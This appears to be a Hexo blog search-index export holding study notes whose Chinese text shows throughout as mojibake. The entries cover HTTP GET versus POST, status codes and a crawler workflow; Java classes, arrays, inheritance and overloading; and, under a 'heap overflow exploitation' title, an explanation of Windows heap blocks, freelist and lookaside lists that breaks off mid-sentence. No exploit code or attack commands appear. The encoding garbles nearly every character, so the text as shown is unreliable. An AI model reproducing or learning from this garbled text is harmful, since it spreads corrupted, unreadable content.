GETæ–¹å¼éœ€è¦ä½¿ç”¨Request.QueryStringæ¥å–å¾—å˜é‡çš„å€¼ï¼Œè€ŒPOSTæ–¹å¼é€šè¿‡Request.Formæ¥èŽ·å–å˜é‡çš„å€¼ã€‚ GETæ–¹å¼æäº¤æ•°æ®ï¼Œä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ï¼Œæ¯”å¦‚ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œé€šè¿‡GETæ–¹å¼æäº¤æ•°æ®æ—¶ï¼Œç”¨æˆ·åå’Œå¯†ç å°†å‡ºçŽ°åœ¨URLä¸Šï¼Œå¦‚æžœé¡µé¢å¯ä»¥è¢«ç¼“å­˜æˆ–è€…å…¶ä»–äººå¯ä»¥è®¿é—®è¿™å°æœºå™¨ï¼Œå°±å¯ä»¥ä»ŽåŽ†å²è®°å½•èŽ·å¾—è¯¥ç”¨æˆ·çš„è´¦å·å’Œå¯†ç . ä¸€ä¸ªURLçš„è¯·æ±‚è¿‡ç¨‹ï¼šå½“ä½ åœ¨æµè§ˆå™¨è¾“å…¥URL http://www.website.com çš„æ—¶å€™ï¼Œæµè§ˆå™¨å‘é€ä¸€ä¸ªRequeståŽ»èŽ·å– http://www. website.comçš„html. æœåŠ¡å™¨æŠŠResponseå‘é€å›žç»™æµè§ˆå™¨.æµè§ˆå™¨åˆ†æžResponseä¸­çš„ HTMLï¼Œå‘çŽ°å…¶ä¸­å¼•ç”¨äº†å¾ˆå¤šå…¶ä»–æ–‡ä»¶ï¼Œæ¯”å¦‚å›¾ç‰‡ï¼ŒCSSæ–‡ä»¶ï¼ŒJSæ–‡ä»¶ã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨å†æ¬¡å‘é€RequeståŽ»èŽ·å–å›¾ç‰‡ï¼ŒCSSæ–‡ä»¶ï¼Œæˆ–è€…JSæ–‡ä»¶ã€‚å½“æ‰€æœ‰çš„æ–‡ä»¶éƒ½ä¸‹è½½æˆåŠŸåŽï¼Œ ç½‘é¡µå°±è¢«æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ åˆ†ç±» åˆ†ç±»æè¿° 1** ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ 2** æˆåŠŸï¼Œæ“ä½œè¢«æˆåŠŸæŽ¥æ”¶å¹¶å¤„ç† 3** é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚ 4** å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚ 5** æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯ æœ€å¸¸ç”¨çš„å“åº”çŠ¶æ€ç  â—†200 (OK): æ‰¾åˆ°äº†è¯¥èµ„æºï¼Œå¹¶ä¸”ä¸€åˆ‡æ­£å¸¸ã€‚ â—†301(Moved Permanently): å®¢æˆ·è¯·æ±‚çš„æ–‡æ¡£åœ¨å…¶ä»–åœ°æ–¹ï¼Œæ–°çš„URLåœ¨Locationå¤´ä¸­ç»™å‡ºï¼Œæµè§ˆå™¨åº”è¯¥è‡ªåŠ¨åœ°è®¿é—®æ–°çš„URLã€‚ â—†302 (Found): ç±»ä¼¼äºŽ301ï¼Œä½†æ–°çš„URLåº”è¯¥è¢«è§†ä¸ºä¸´æ—¶æ€§çš„æ›¿ä»£ï¼Œè€Œä¸æ˜¯æ°¸ä¹…æ€§çš„ã€‚ â—†304 (NOT MODIFIED): è¯¥èµ„æºåœ¨ä¸Šæ¬¡è¯·æ±‚ä¹‹åŽæ²¡æœ‰ä»»ä½•ä¿®æ”¹ã€‚è¿™é€šå¸¸ç”¨äºŽæµè§ˆå™¨çš„ç¼“å­˜æœºåˆ¶ã€‚ â—†400 (Bad Request): è¯·æ±‚å‡ºçŽ°è¯­æ³•é”™è¯¯ã€‚ â—†403 (FORBIDDEN): å®¢æˆ·ç«¯æœªèƒ½èŽ·å¾—æŽˆæƒã€‚è¿™é€šå¸¸æ˜¯åœ¨401ä¹‹åŽè¾“å…¥äº†ä¸æ­£ç¡®çš„ç”¨æˆ·åæˆ–å¯†ç ã€‚ â—†404 (NOT FOUND): åœ¨æŒ‡å®šçš„ä½ç½®ä¸å­˜åœ¨æ‰€ç”³è¯·çš„èµ„æºã€‚ â—†500 (Internal Server Error): æœåŠ¡å™¨é‡åˆ°äº†æ„æ–™ä¸åˆ°çš„æƒ…å†µï¼Œä¸èƒ½å®Œæˆå®¢æˆ·çš„è¯·æ±‚ â—†503 (Service Unavailable): æœåŠ¡å™¨ç”±äºŽç»´æŠ¤æˆ–è€…è´Ÿè½½è¿‡é‡æœªèƒ½åº”ç­”ã€‚ä¾‹å¦‚ï¼ŒServletå¯èƒ½åœ¨æ•°æ®åº“è¿žæŽ¥æ± å·²æ»¡çš„æƒ…å†µä¸‹è¿”å›ž503ã€‚æœåŠ¡å™¨è¿”å›ž503æ—¶å¯ä»¥æä¾›ä¸€ä¸ªRetry-Afterå¤´ å·¥ä½œæµç¨‹ é¦–å…ˆé€‰å–ä¸€éƒ¨åˆ†ç²¾å¿ƒæŒ‘é€‰çš„ç§å­URLï¼› å°†è¿™äº›URLæ”¾å…¥å¾…æŠ“å–URLé˜Ÿåˆ—ï¼› ä»Žå¾…æŠ“å–URLé˜Ÿåˆ—ä¸­å–å‡ºå¾…æŠ“å–åœ¨URLï¼Œè§£æžDNSï¼Œå¹¶ä¸”å¾—åˆ°ä¸»æœºçš„ipï¼Œå¹¶å°†URLå¯¹åº”çš„ç½‘é¡µä¸‹è½½ä¸‹æ¥ï¼Œå­˜å‚¨è¿›å·²ä¸‹è½½ç½‘é¡µåº“ä¸­ã€‚æ­¤å¤–ï¼Œå°†è¿™äº›URLæ”¾è¿›å·²æŠ“å–URLé˜Ÿåˆ—ã€‚ åˆ†æžå·²æŠ“å–URLé˜Ÿåˆ—ä¸­çš„URLï¼Œåˆ†æžå…¶ä¸­çš„å…¶ä»–URLï¼Œå¹¶ä¸”å°†URLæ”¾å…¥å¾…æŠ“å–URLé˜Ÿåˆ—ï¼Œä»Žè€Œè¿›å…¥ä¸‹ä¸€ä¸ªå¾ªçŽ¯ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019/9/30]]></title>
    <url>%2F2019%2F09%2F20%2FJava%2F</url>
    <content type="text"><![CDATA[Java0.publicæ˜¯ä¸ºäº†å…¬å¼€ç»™å…¶ä»–ç±»å­˜å–ï¼Œclassæ˜¯å£°æ˜Žç±»ï¼ŒMyfirstæ˜¯ç±»çš„åç§°ã€‚ mainä¸ºæ–¹æ³•åï¼ŒString[] agrsè¡¨ç¤ºä¼ stringçš„å­—ç¬¦ä¸²ç»™æ­¤æ–¹æ³•å½“å‚æ•°ï¼Œå‘½åä¸ºargsã€‚ Javaçš„æºæ–‡ä»¶ä¸º.javaï¼Œç¼–è¯‘ä¹‹åŽçš„.classæ–‡ä»¶ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ 12345public class Myfisrt&#123; public static void main (String[] args)&#123; System.out.print(&quot;HelloWorld!&quot;); &#125;&#125; 1.for eachå¾ªçŽ¯ 123456int[] ns =&#123;1,2,3&#125;for (int n :ns)&#123; System.out.println(n);//ç”¨äºŽå°†æ•°ç»„ä¸­çš„å…ƒç´ éåŽ†&#125; 2.Arrays.toString()å‡½æ•° 1234int[] ns = &#123;1,2,3&#125;System.out.println(Arrays.toString(ns));//æ­¤å‡½æ•°ç›´æŽ¥å°†æ•°ç»„ä¸­å…ƒç´ éåŽ† 3.Arrays.sort()å‡½æ•°ï¼Œå¯¹æ•°ç»„è¿›è¡ŒæŽ’åºï¼Œå‚æ•°ä¸ºæ•°ç»„åã€‚ 4.Arrays.deepToString()ç”¨äºŽæ‰“å°äºŒç»´æ•°ç»„çš„å‡½æ•°ã€‚ 5.breakä¼šè·³å‡ºå½“å‰å¾ªçŽ¯ï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªå¾ªçŽ¯éƒ½ä¸ä¼šæ‰§è¡Œäº†ã€‚è€Œcontinueåˆ™æ˜¯æå‰ç»“æŸæœ¬æ¬¡å¾ªçŽ¯ï¼Œç›´æŽ¥ç»§ç»­æ‰§è¡Œä¸‹æ¬¡å¾ªçŽ¯ã€‚ 6.Substring(Beginindexï¼ŒEndindex)å‡½æ•°ï¼Œå¯¹å­—ç¬¦ä¸²è¿›è¡Œå‰ªåˆ‡ã€‚èµ·å§‹ç´¢å¼•ä»Žé›¶å¼€å§‹ï¼Œç»“æŸç´¢å¼•ä»Ž1å¼€å§‹ã€‚å‰ªåˆ‡ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ™å‚æ•°ä¸º0ï¼Œ1. 7.Javaä¸­çš„Stringä¸€æ—¦è¢«å®šä¹‰å°±æ— æ³•æ”¹å˜ï¼Œåªèƒ½é‡æ–°å®šä¹‰ä¸€ä¸ªå˜é‡æ¥ä¿å­˜ã€‚ 8.ç»§æ‰¿ï¼šå½“å®šä¹‰çš„æ–°classåŒ…å«äº†å·²æœ‰classçš„å­—æ®µä¸Žæ–¹æ³•æ—¶ï¼Œå³å¯ä½¿ç”¨ç»§æ‰¿(extends)å®žçŽ°ä»£ç å¤ç”¨ã€‚æ ¼å¼ï¼šclass æ–°ç±»å extends æ—§ç±»åã€‚å‰è€…ç§°ä¸ºçˆ¶ç±»ï¼ŒåŽè€…ç§°ä¸ºå­ç±»ã€‚ ç»§æ‰¿çš„ç±»æ— æ³•è®¿é—®å…¶çˆ¶ç±»çš„privateå­—æ®µä¸Žæ–¹æ³•ï¼Œé™¤éžæŠŠprivateæ”¹ä¸ºprotectedï¼Œåˆ™å¯è¢«å…¶å­ç±»ä»¥åŠå­ç±»çš„å­ç±»è®¿é—®ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹å¯ä»¥ç›´æŽ¥å¼•ç”¨çˆ¶ç±»ä¸­çš„æ–¹æ³•ä¸Žå­—æ®µï¼Œä½†å¦‚æžœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æž„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨super(),å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æž„é€ æ–¹æ³•ã€‚ 9.æ³¨æ„Stringä¸Žstringï¼ŒDoubleä¸Ždoubleçš„åŒºåˆ«ã€‚ ç±»ä¸Žå¯¹è±¡ç±»çš„å®šä¹‰å®šä¹‰ä¸€ä¸ªclass [ç±»ä¿®é¥°ç¬¦] class [ç±»å] [extends çˆ¶ç±»ï¼Œimplements æŽ¥å£]{ //æˆå‘˜å˜é‡ //æˆå‘˜æ–¹æ³• //æž„é€ å™¨ //â€¦â€¦ } ç±»ä¿®é¥°ç¬¦ï¼špublicï¼Œprotectedï¼Œprivateï¼Œabstractï¼Œstaticï¼Œfinalï¼Œstrictfpã€‚ æˆå‘˜å˜é‡å£°æ˜Žæˆå‘˜å˜é‡ï¼š [ä¿®é¥°ç¬¦] æ•°æ®ç±»åž‹ å˜é‡å = [åˆå§‹åŒ–å€¼] 12345public class Student&#123; private String name; protected float score; String ID;&#125; å˜é‡åˆ†ç±»ï¼š æˆå‘˜å˜é‡ï¼šç±»ä¼¼Cè¯­è¨€ä¸­å…¨å±€å˜é‡ï¼Œåœ¨æ•´ä¸ªç±»ä¸­éƒ½æœ‰æ•ˆã€‚ å±€éƒ¨å˜é‡ï¼šåœ¨è¯¥ä»£ç å—/è¯¥æ–¹æ³•ä¸­æœ‰æ•ˆã€‚ å‚æ•°å˜é‡ï¼šåœ¨è¯¥æ–¹æ³•æˆ–catchä»£ç å—ä¸­æœ‰æ•ˆã€‚ å˜é‡ä¿®é¥°ç¬¦ï¼š public protected private è®¾å®šæˆå‘˜å˜é‡çš„è®¿é—®æƒé™ï¼Œæ— æ³•ä¿®é¥°å±€éƒ¨å˜é‡ä¸Žå‚æ•°å˜é‡ static åªèƒ½å¤Ÿä¿®é¥°æˆå‘˜å˜é‡ï¼Œä¸èƒ½å¤Ÿä¿®é¥°å±€éƒ¨å˜é‡ä¸Žå‚æ•°å˜é‡ï¼Œç”±staticä¿®é¥°çš„æˆå‘˜å˜é‡ä¸ºé™æ€æˆå‘˜å˜é‡ï¼Œåä¹‹ä¸ºéžé™æ€æˆå‘˜å˜é‡ï¼ˆå®žä¾‹å˜é‡ï¼‰ finalå¸¸é‡ transient åªèƒ½ä¿®é¥°æˆå‘˜å˜é‡ï¼Œåºåˆ—åŒ–æ—¶ä¸ä¼šè¢«ä¿å­˜ volatile åªèƒ½ä¿®é¥°æˆå‘˜å˜é‡ï¼Œå¤šçº¿ç¨‹ç›¸å…³ æ‰€æœ‰å˜é‡åœ¨å£°æ˜Žæ—¶ä¸ç”¨åˆå§‹åŒ–ï¼Œä½†åœ¨ä½¿ç”¨å‰å¿…é¡»åˆå§‹åŒ–ï¼Œå¦åˆ™ç¼–è¯‘é”™è¯¯ã€‚ æˆå‘˜æ–¹æ³• [ä¿®é¥°è¯] è¿”å›žç±»åž‹ æ–¹æ³•å ([å‚æ•°1ï¼Œå‚æ•°2ï¼Œâ€¦]) [throws å¼‚å¸¸]{ æ–¹æ³•å®žçŽ° } setteræ–¹æ³•å’Œgetteræ–¹æ³•ï¼š å‡ºäºŽå°è£…è€ƒè™‘ï¼ŒæŸäº›classçš„æˆå‘˜å˜é‡é€šå¸¸éƒ½å£°æ˜Žä¸ºprivateå˜é‡ï¼Œæ— æ³•ç›´æŽ¥è®¿é—®æ­¤å¯¹è±¡çš„privateå±žæ€§ï¼Œé€šå¸¸çš„åšæ³•å°±æ˜¯ï¼šä¸ºprivateçš„æˆå‘˜å˜é‡å£°æ˜Žpublicçš„è®¿é—®æŽ¥å£ï¼Œç§°ä¸ºsetteræ–¹æ³•ä¸Žgetteræ–¹æ³•ã€‚ setterï¼š å‘½åæ–¹æ³•ï¼šset+å˜é‡åï¼Œsuch as setName/setScoreï¼›setteræ–¹æ³•ç”¨äºŽèµ‹å€¼ï¼Œè¿”å›žç±»åž‹éƒ½ä¸ºvoid getterï¼š å‘½åæ–¹æ³•ï¼šget+å˜é‡åï¼Œsuch as getName/getScore ï¼›getteræ–¹æ³•ç”¨äºŽå–å€¼ï¼Œæ— éœ€è¾“å…¥å‚æ•°ï¼Œä½†æ˜¯è¿”å›žç±»åž‹ä¸€å®šæ˜¯è¯¥æˆå‘˜å˜é‡çš„æ•°æ®ç±»åž‹ã€‚ public protected private è®¿é—®æŽ§åˆ¶ä¿®é¥°ç¬¦ï¼Œç”¨äºŽè®¾å®šæˆå‘˜æ–¹æ³•çš„è®¿é—®æƒé™ abstract ä¿®é¥°çš„æ–¹æ³•å«æŠ½è±¡æ–¹æ³•ï¼Œ æŠ½è±¡æ–¹æ³•åªæœ‰æ–¹æ³•çš„å£°æ˜Žéƒ¨åˆ†ï¼Œ æ²¡æœ‰æ–¹æ³•ä½“éƒ¨ åˆ†ï¼Œä¹Ÿå°±ä¸æä¾›æ–¹æ³•çš„å®žçŽ° é‡è½½Javaå…è®¸åŒä¸€ä¸ªç±»ä¸­å®šä¹‰å¤šä¸ªåŒåæ–¹æ³•ï¼Œåªè¦å…¶å½¢å‚åˆ—è¡¨ä¸åŒå³å¯ã€‚å¦‚æžœä¸€ä¸ªç±»ä¸­åŒ…å«äº†ä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Šæ–¹æ³•åç›¸åŒçš„æ–¹æ³•ï¼Œä½†æ˜¯å½¢å‚åˆ—è¡¨ä¸åŒï¼Œè¿™ç§æƒ…å†µè¢«ç§°ä¸ºé‡è½½overloadã€‚ æ–¹æ³•é‡è½½çš„è¦æ±‚æ˜¯åŒä¸€ä¸ªç±»ä¸­æ–¹æ³•åç›¸åŒï¼Œå‚æ•°åˆ—è¡¨ä¸åŒã€‚æ–¹æ³•çš„å…¶ä»–éƒ¨åˆ†å¦‚è¿”å›žå€¼ç±»åž‹/ä¿®é¥°ç¬¦ç­‰ï¼Œä¸Žæ–¹æ³•é‡è½½æ— å…³ã€‚å®žé™…è°ƒç”¨æ—¶ï¼Œæ ¹æ®å®žå‚çš„ç±»åž‹æ¥å†³å®šè°ƒç”¨å“ªä¸€ä¸ªæ–¹æ³•ã€‚ Tips Javaä½œä¸ºé¢å‘å¯¹è±¡çš„è¯­è¨€ï¼ŒåŒæ ·å¯ä»¥æè¿°ä¸€ä¸ªäº‹ç‰©çš„å¤šç§å½¢æ€ã€‚å¦‚Studentç±»ç»§æ‰¿äº†Personç±»ï¼Œä¸€ä¸ªStudentçš„å¯¹è±¡ä¾¿æ—¢æ˜¯Studentï¼Œåˆæ˜¯Personã€‚ 123456 Person ming = new Person(); ......class Person &#123; private String name; private int age;&#125; å¯¹è±¡ä¸Žç±»ç›¸å¯¹åº”ï¼Œç¬¬ä¸€è¡Œä»£ç Person ming = new Person()ç›¸å½“äºŽåˆ›å»ºäº†ä¸€ä¸ªåä¸ºmingçš„å¯¹è±¡ï¼Œå…·æœ‰name(String)å’Œage(int)ä¸¤ç§å±žæ€§ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[å †æº¢å‡ºåˆ©ç”¨]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[å †ä¸Žæ ˆçš„åŒºåˆ«ï¼šå †åŸºç¡€å †ä¸Žæ ˆçš„åŒºåˆ«ï¼š å †æ˜¯ä¸€ç§åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œæ‰€è°“åŠ¨æ€åˆ†é…æ˜¯æŒ‡æ‰€éœ€å†…å­˜å¤§å°åœ¨ç¨‹åºè®¾è®¡æ—¶å¹¶ä¸èƒ½äº‹å…ˆå†³å®šï¼Œéœ€è¦åœ¨ç¨‹åºè¿è¡Œæ—¶å‚è€ƒç”¨æˆ·çš„åé¦ˆã€‚ å †åœ¨ä½¿ç”¨æ—¶éœ€è¦ç¨‹åºå‘˜ä½¿ç”¨ä¸“é—¨çš„å‡½æ•°è¿›è¡Œç”³è¯·ï¼Œå¦‚Cè¯­è¨€ä¸­çš„mallocå‡½æ•°ï¼Œæ˜¯åˆ†é…å†…å­˜çš„å‡½æ•°ï¼Œå †å†…å­˜ç”³è¯·æœ‰å¯èƒ½æˆåŠŸï¼Œä¹Ÿæœ‰å¯èƒ½å¤±è´¥ï¼Œè¿™ä¸Žç”³è¯·çš„å†…å­˜å¤§å°ï¼Œæœºå™¨æ€§èƒ½å’Œå½“å‰è¿è¡ŒçŽ¯å¢ƒæœ‰å…³ã€‚ ä¸€èˆ¬ä½¿ç”¨ä¸€ä¸ªå †æŒ‡é’ˆæ¥ä½¿ç”¨ç”³è¯·å¾—åˆ°çš„å†…å­˜ï¼Œè¯»å†™é‡Šæ”¾éƒ½é€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ¥å®Œæˆã€‚ ä½¿ç”¨å®Œæ¯•åŽéœ€è¦æŠŠå †æŒ‡é’ˆä¼ é€’ç»™å †é‡Šæ”¾å‡½æ•°å›žæ”¶è¿™ç‰‡å†…å­˜ï¼Œå¦åˆ™ä¼šé€ æˆå†…å­˜æ³„éœ²ï¼Œå…¸åž‹çš„å †é‡Šæ”¾å‡½æ•°å¦‚freeï¼Œdeleteã€‚ çŽ°ä»£æ“ä½œç³»ç»Ÿçš„å †æ•°æ®ç»“æž„ä¸€èˆ¬åŒ…æ‹¬å †å—ä¸Žå †è¡¨ä¸¤ç±»ï¼š å †å—ï¼šå‡ºäºŽæ€§èƒ½çš„è€ƒè™‘ï¼Œå †åŒºçš„å†…å­˜æŒ‰å¤§å°ç»„ç»‡æˆå—ï¼Œä»¥å—ä¸ºå•ä½è¿›è¡Œæ ‡è¯†ï¼Œè€Œä¸æ˜¯ä»¥ä¼ ç»Ÿçš„å­—èŠ‚è¿›è¡Œæ ‡è¯†ã€‚ä¸€ä¸ªå †å—åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼šå—é¦–ä¸Žå—èº«ã€‚å—é¦–æ˜¯ä¸€ä¸ªå †å—å¤´éƒ¨çš„å‡ ä¸ªå­—èŠ‚ï¼Œç”¨æ¥æ ‡è¯†è¿™ä¸ªå †å—è‡ªèº«çš„ä¿¡æ¯ï¼Œå¦‚å¤§å°ï¼Œæ˜¯å¦é—²ç½®ç­‰ã€‚å—èº«æ˜¯ç´§è·Ÿéšåœ¨å—é¦–åŽçš„éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æœ€ç»ˆéžé™ªç»™ç”¨æˆ·ä½¿ç”¨çš„æ•°æ®åŒºã€‚ å †è¡¨ï¼Œå †è¡¨ä¸€èˆ¬ä½äºŽå †åŒºçš„èµ·å§‹ä½ç½®ï¼Œç”¨äºŽç´¢å¼•å †åŒºä¸­æ‰€æœ‰å †å—çš„é‡è¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬å †å—çš„ä½ç½®ï¼Œå¤§å°ï¼Œæ˜¯å¦è¢«å ç”¨ç­‰ç­‰ã€‚ï¼ˆå †è¡¨çš„æ•°æ®ç»“æž„å†³å®šäº†æ•´ä¸ªå †åŒºçš„ç»„ç»‡æ–¹å¼ï¼Œæ˜¯å¿«é€Ÿæ£€ç´¢ç©ºé—²å—ï¼Œä¿è¯å †åˆ†é…æ•ˆçŽ‡çš„å…³é”®ã€‚å †è¡¨çš„è®¾è®¡ä¼šé‡‡ç”¨äºŒå‰æ ‘ç­‰é«˜çº§æ•°æ®ç»“æž„ç”¨äºŽä¼˜åŒ–æŸ¥æ‰¾æ•ˆçŽ‡ã€‚ åœ¨Windowsä¸­ï¼Œå ç”¨æ€çš„å †å—è¢«ä½¿ç”¨å®ƒçš„ç¨‹åºç´¢å¼•ï¼Œè€Œå †è¡¨åªç´¢å¼•ç©ºé—²çš„å †å—ã€‚å…¶ä¸­æœ€é‡è¦çš„å †è¡¨æœ‰ä¸¤ç§ï¼š ç©ºé—²åŒå‘é“¾è¡¨Freelist/å¿«é€Ÿå•å‘é“¾è¡¨Lookaside ç©ºé—²åŒå‘é“¾è¡¨ç©ºé—²å †å—çš„å—é¦–åŒ…å«ä¸€å¯¹é‡è¦çš„æŒ‡é’ˆï¼Œè¿™å¯¹æŒ‡é’ˆç”¨äºŽå°†ç©ºé—²å †å—ç»„ç»‡æˆåŒå‘é“¾è¡¨ã€‚æŒ‰ç…§å †å—å¤§å°ä¸åŒï¼Œç©ºè¡¨æ€»å…±è¢«åˆ†ä¸º128æ¡(å³æŒ‡é’ˆæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ åŒ…å«ä¸€æ¡åŒå‘é“¾è¡¨)ã€‚ å †åŒºä¸€å¼€å§‹çš„å †è¡¨åŒºä¸­æœ‰ä¸€ä¸ª128é¡¹çš„æŒ‡é’ˆæ•°ç»„ï¼Œè¢«ç§°ä¸ºç©ºè¡¨ç´¢å¼•(Freelist Array),è¯¥æ•°ç»„çš„æ¯ä¸€é¡¹åŒ…å«ä¸¤ä¸ªæŒ‡é’ˆï¼Œç”¨äºŽæ ‡è¯†ä¸€æ¡ç©ºè¡¨ã€‚ ç©ºè¡¨ç´¢å¼•çš„ç¬¬äºŒé¡¹free[1]æ ‡è¯†äº†å †ä¸­æ‰€æœ‰å¤§å°ä¸º16å­—èŠ‚çš„ç©ºé—²å †å—ï¼Œfree[2]æ ‡è¯†äº†å †ä¸­æ‰€æœ‰å¤§å°ä¸º24å­—èŠ‚çš„ç©ºé—²å †å—ï¼Œä¾æ¬¡ç±»æŽ¨æœ‰ï¼šç©ºé—²å †å—å¤§å°=ç´¢å¼•é¡¹*8(å­—èŠ‚)ã€‚ æŠŠç©ºé—²å †å—æŒ‰ç…§å¤§å°ä¸åŒé“¾å…¥ä¸åŒçš„é“¾è¡¨ï¼Œå¯ä»¥æ–¹ä¾¿å †ç®¡ç†ç³»ç»Ÿé«˜æ•ˆæ£€ç´¢æŒ‡å®šå¤§å°çš„ç©ºé—²å †å—ã€‚ç©ºè¡¨ç´¢å¼•çš„ç¬¬ä¸€é¡¹(free[0]æ‰€æ ‡è¯†çš„ç©ºè¡¨)æ¯”è¾ƒç‰¹æ®Šï¼Œè¿™æ¡åŒå‘é“¾è¡¨æ ‡è¯†äº†æ‰€æœ‰å¤§äºŽç­‰äºŽ1024å­—èŠ‚çš„å †å—ã€‚ å¿«é€Ÿå•å‘é“¾è¡¨å—è¡¨æ˜¯Windowsç”¨æ¥åŠ é€Ÿå †å—åˆ†é…è€Œé‡‡ç”¨çš„ä¸€ç§å †è¡¨ï¼Œå—è¡¨ä¹‹æ‰€ä»¥å¿«ï¼Œæ˜¯å› ä¸ºè¿™ç±»å•å‘é“¾è¡¨ä¸­ä»Žæ¥ä¸ä¼šå‘ç”Ÿå †å—åˆå¹¶(å…¶ä¸­çš„ç©ºé—²å—å—é¦–è¢«è®¾ç½®ä¸ºå ç”¨æ€ï¼Œä»¥é˜²æ­¢å †å—åˆå¹¶)ã€‚ å¿«è¡¨ä¹Ÿæœ‰128æ¡ï¼Œç»„ç»‡ç»“æž„ä¸Žç©ºè¡¨ç±»ä¼¼ï¼Œä½†æ˜¯å…¶ä¸­çš„å †å—æŒ‰ç…§å•é“¾è¡¨ç»„ç»‡ã€‚å—è¡¨æ€»æ˜¯è¢«åˆå§‹åŒ–ä¸ºç©ºï¼Œå¹¶ä¸”æ¯æ¡å¿«è¡¨æœ€å¤šæœ‰å››ä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥å¾ˆå¿«å°±ä¼šè¢«å¡«æ»¡ã€‚ å †å—åˆ†é…/å †å—é‡Šæ”¾/å †å—åˆå¹¶ï¼ˆCoaleace)åˆ†é…ä¸Žé‡Šæ”¾æ˜¯åœ¨ç¨‹åºæäº¤ä¸Žæ‰§è¡Œçš„ï¼Œåˆå¹¶æ˜¯ç”±å †ç®¡ç†ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ã€‚ å †å—åˆ†é…å †å—åˆ†é…å¯ä»¥åˆ†æˆä¸‰ç±»ï¼šå—è¡¨åˆ†é…ï¼Œæ™®é€šç©ºè¡¨åˆ†é…å’Œé›¶å·ç©ºè¡¨åˆ†é…ã€‚ å¿«è¡¨åˆ†é…æ¯”è¾ƒç®€å•ï¼ŒåŒ…æ‹¬å¯»æ‰¾åˆ°å¤§å°åŒ¹é…çš„ç©ºé—²å †å—(åªæœ‰ç²¾å‡†åŒ¹é…æ—¶æ‰ä¼šä½¿ç”¨å¿«è¡¨åˆ†é…ï¼Œæ•…ä¸å­˜åœ¨å¯¹å—çš„åˆ†å‰²æ“ä½œ)ï¼Œå°†å…¶çŠ¶æ€ä¿®æ”¹ä¸ºå ç”¨æ€ï¼Œå°†å®ƒä»Žå †è¡¨ä¸­å¸ä¸‹ï¼Œæœ€åŽè¿”å›žä¸€ä¸ªæŒ‡å‘å †å—å—èº«çš„æŒ‡é’ˆç»™ç¨‹åºä½¿ç”¨ã€‚ æ™®é€šç©ºè¡¨åˆ†é…æ—¶ï¼Œé¦–å…ˆå¯»æ‰¾æœ€ä¼˜çš„ç©ºé—²å—è¿›è¡Œåˆ†é…ï¼Œå†å¯»æ‰¾æ¬¡ä¼˜çš„ç©ºé—²å—è¿›è¡Œåˆ†é…ï¼Œä¸€ç›´å¯»æ‰¾åˆ°æœ€å°èƒ½å¤Ÿæ»¡è¶³è¦æ±‚çš„ç©ºé—²å—ã€‚ï¼Ÿï¼Ÿï¼Ÿï¼Ÿæœ€ä¼˜åˆ°åº•æŒ‡çš„æ˜¯ä»¥ä»€ä¹ˆä¸ºæ ‡å‡†ã€‚ é›¶å·ç©ºè¡¨ä¸­ï¼ŒæŒ‰ç…§å¤§å°å‡åºé“¾æŽ¥å¤§å°ä¸åŒçš„ç©ºé—²å—ï¼Œæ•…åœ¨åˆ†é…å†…å­˜çš„æ—¶å€™ä¼šåå‘æŸ¥æ‰¾æœ€åŽä¸€ä¸ª(å³é“¾è¡¨ä¸­æœ€å¤§çš„ä¸€ä¸ªå †å—)ï¼Œçœ‹èƒ½å¦æ»¡è¶³è¦æ±‚ã€‚å¦‚æžœæ»¡è¶³è¦æ±‚ï¼Œåˆ™ç¡®å®šèƒ½å¤ŸæˆåŠŸåˆ†é…ã€‚å†ä»Žç¬¬ä¸€ä¸ªå †å—å¼€å§‹ä»Žå°åˆ°å¤§æ­£å‘æœç´¢æœ€å°èƒ½å¤Ÿæ»¡è¶³æ¡ä»¶çš„å †å—(é›¶å·ç©ºè¡¨å‡åºæŽ’åˆ—çš„åŽŸå› )ã€‚ å½“æ— æ³•æ‰¾åˆ°åŒ¹é…çš„æœ€ä¼˜å †å—æ—¶(å¤§å°å®Œå…¨ç²¾å‡†ç¬¦åˆ)ï¼Œä¸€ä¸ªç¨å¤§ä¸€äº›çš„å 